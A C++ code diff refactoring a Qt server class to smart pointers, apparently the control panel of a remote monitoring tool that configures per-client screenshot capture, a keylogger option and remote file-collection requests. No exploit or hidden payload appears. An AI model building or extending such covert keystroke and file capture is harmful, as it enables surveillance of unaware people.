@@ -6,11 +6,14 @@
 //https://www.iconfinder.com/icons/46254/active_approval_online_status_icon#size=16
 //https://www.iconfinder.com/icons/46252/busy_offline_status_icon#size=16
 
-Server::Server(QWidget *parent, const QString& defaultPath, quint16 _port) :
-    QMainWindow(parent),
-    path(defaultPath),
-    localPort(_port),
-    ui(new Ui::Server)
+Server::Server(QWidget *parent, const QString& defaultPath, quint16 port_) :
+    QMainWindow{parent},
+    path{defaultPath},
+    localPort{port_},
+    ui{std::make_unique<Ui::Server>()},
+    uiMapper{std::make_unique<QDataWidgetMapper>(this)},
+    fileServer{std::make_unique<FileServer>(this, port_, path + "/users")},
+    fileClient{std::make_unique<FileClient>(this, "127.0.0.1", 1234)}
 {
     ui->setupUi(this);
     ui->buttonFileDialog->setEnabled(false);
@@ -30,11 +33,10 @@ Server::Server(QWidget *parent, const QString& defaultPath, quint16 _port) :
 
     //Setup model
     setupModels();
-    ui->treeUsers->setModel(treeModel);
+    ui->treeUsers->setModel(treeModel.get());
 
     //Setup mapper
-    uiMapper = new QDataWidgetMapper(this);
-    uiMapper->setModel(treeModel);
+    uiMapper->setModel(treeModel.get());
     uiMapper->addMapping(ui->spinSeconds, 3, "value");
     uiMapper->addMapping(ui->checkLMB, 4);
     uiMapper->addMapping(ui->checkRMB, 5);
@@ -64,15 +66,32 @@ Server::Server(QWidget *parent, const QString& defaultPath, quint16 _port) :
                 disconnect(ui->treeUsers->selectionModel(), &QItemSelectionModel::currentRowChanged, 0, 0);
     });
 
-    //Start modules
-    fileServer = new FileServer(this, localPort, path + "/users");
-    fileClient = new FileClient(this, "127.0.0.1", 1234);
-    fileServer->start();
 
     QDir configDir;
     configDir.mkpath(path + "/configs");
 
-    connect(fileServer, &FileServer::stringReceived, [this](QString str, QString ip) { this->getString(str, ip); });
+    //Start modules
+    fileServer->start();
+    connect(fileServer.get(), &FileServer::stringReceived, [this](QString str, QString ip) { this->getString(str, ip); });
+
+    //Send config
+    connect(fileClient.get(), &FileClient::transmitted, [this]()
+    {
+        QString cfg = path + "/configs/" + fileClient->getIp();
+        QFile oldCfgFile(cfg + ".cfg");
+        //Remove old config
+        if (oldCfgFile.exists())
+            oldCfgFile.remove();
+        //Rename new config to ".cfg"
+        QFile tempCfgFile(cfg + "_temp.cfg");
+        tempCfgFile.rename(cfg + ".cfg");
+
+        //disconnect after file transfer
+
+        //TODO ???
+//            const FileClient* ptr = fileClient.get();
+//            disconnect(ptr, &FileClient::transmitted, 0, 0);
+    });
 
     //Connect buttons clicks
     connect(ui->buttonSendConfig, &QPushButton::clicked, this, &Server::configSendClicked);
@@ -83,16 +102,11 @@ Server::Server(QWidget *parent, const QString& defaultPath, quint16 _port) :
 Server::~Server()
 {
     saveUsers();
-    delete uiMapper;
-    delete treeModel;
-    delete fileServer;
-    delete fileClient;
-    delete ui;
 }
 
 void Server::setupModels()
 {
-    treeModel = new QStandardItemModel(this);
+    treeModel = std::make_unique<QStandardItemModel>(this);
     treeModel->setColumnCount(10);
 
     //Set header names
@@ -154,10 +168,10 @@ void Server::initTreeModel(QList<QStandardItem*>& items,
     portItem->setFlags(portItem->flags() & ~Qt::ItemIsEditable);
 
     QStandardItem* secondsItem = new QStandardItem(QString::number(cfg->secondsScreen));
-    QStandardItem* LMB = new QStandardItem(QString(cfg->mouseButtons[to_underlying(Buttons::left)] ? "1" : "0"));
-    QStandardItem* RMB = new QStandardItem(QString(cfg->mouseButtons[to_underlying(Buttons::right)] ? "1" : "0"));
-    QStandardItem* MMB = new QStandardItem(QString(cfg->mouseButtons[to_underlying(Buttons::middle)] ? "1" : "0"));
-    QStandardItem* MWH = new QStandardItem(QString(cfg->mouseButtons[to_underlying(Buttons::wheel)] ? "1" : "0"));
+    QStandardItem* LMB = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::left)] ? "1" : "0"));
+    QStandardItem* RMB = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::right)] ? "1" : "0"));
+    QStandardItem* MMB = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::middle)] ? "1" : "0"));
+    QStandardItem* MWH = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::wheel)] ? "1" : "0"));
     QStandardItem* secondsLogItem = new QStandardItem(QString::number(cfg->secondsLog));
     QStandardItem* logRunItem = new QStandardItem(cfg->logRun ? "1" : "0");
 
@@ -303,7 +317,7 @@ void Server::setConfig(Config &cfg)
         buttons += treeModel->index(currentRow, 5).data().toBool() ? '1' : '0';
         buttons += treeModel->index(currentRow, 4).data().toBool() ? '1' : '0';
         //Screenshot
-        cfg.mouseButtons = std::bitset<to_underlying(Buttons::count)>(buttons.toStdString());
+        cfg.mouseButtons = std::bitset<int(Buttons::count)>(buttons.toStdString());
         cfg.secondsScreen = treeModel->index(currentRow, 3).data().toInt();
         //Keylogger
         cfg.logRun = treeModel->index(currentRow, 8).data().toBool();
@@ -334,28 +348,13 @@ void Server::configSendClicked()
         //Save temp config
         saveConfig(*cfg, tempCfgPath);
 
-        //Send config
-        connect(fileClient, &FileClient::transmitted, [this]()
-        {
-            QString cfg = path + "/configs/" + fileClient->getIp();
-            QFile oldCfgFile(cfg + ".cfg");
-            //Remove old config
-            if (oldCfgFile.exists())
-                oldCfgFile.remove();
-            //Rename new config to ".cfg"
-            QFile tempCfgFile(cfg + "_temp.cfg");
-            tempCfgFile.rename(cfg + ".cfg");
-            //disconnect after file transfer
-            disconnect(fileClient, &FileClient::transmitted, 0, 0);
-        });
-
-        connect(fileClient, &FileClient::error, [this](QAbstractSocket::SocketError socketError)
+        connect(fileClient.get(), &FileClient::error, [this](QAbstractSocket::SocketError socketError)
         {
             qDebug() << "Config not sent" << socketError;
             QString cfg = path + "/configs/" + fileClient->getIp();
             QFile tempCfgFile(cfg + "_temp.cfg");
             tempCfgFile.remove();
-            disconnect(fileClient, &FileClient::error, 0, 0);
+            disconnect(fileClient.get(), &FileClient::error, 0, 0);
         });
 
         //Send config
@@ -384,24 +383,25 @@ void Server::configSaveClicked()
 
 void Server::fileDialogClicked()
 {
-    fileDialog = new FileDialog(this);
+    fileDialog = std::make_unique<FileDialog>(this);
     //fileDialog->setAttribute(Qt::WA_DeleteOnClose, true);
-
     fileDialog->show();
 
     //Connect "accepted" and "rejected"
-    connect(fileDialog, &FileDialog::accepted, this, &Server::fileDialogAccepted);
-    connect(fileDialog, &FileDialog::rejected, fileDialog, &FileDialog::deleteLater);
+    connect(fileDialog.get(), &FileDialog::accepted, this, &Server::fileDialogAccepted);
+//    connect(fileDialog.get(), &FileDialog::rejected, fileDialog.get(), &FileDialog::deleteLater);
 }
 
 void Server::fileDialogAccepted()
 {
     QString mask = QString::number(fileDialog->getFileMask());
-    QString string = fileDialog->getFileString();
+    //TODO del
+
+//    QString string = fileDialog->getFileString();
 
     //If no parameters set or user isn't selected
-    if ( (mask == "0" && string.isEmpty()) || ui->treeUsers->currentIndex() == QModelIndex())
-    {    }
+    if ( (mask == "0" /* && string.isEmpty() */ ) || ui->treeUsers->currentIndex() == QModelIndex())
+        return;
     else
     {
         QModelIndex ipIndex = treeModel->index(ui->treeUsers->currentIndex().row(), 1);
@@ -411,8 +411,7 @@ void Server::fileDialogAccepted()
         fileClient->changePeer(ip, port);
 
         //Send string
-        fileClient->enqueueData(_STRING, "FILES|" + mask + '|' + string);
+        fileClient->enqueueData(_STRING, "FILES|" + mask /* + '|' + string */);
         fileClient->connect();
     }
-    delete fileDialog;
 }
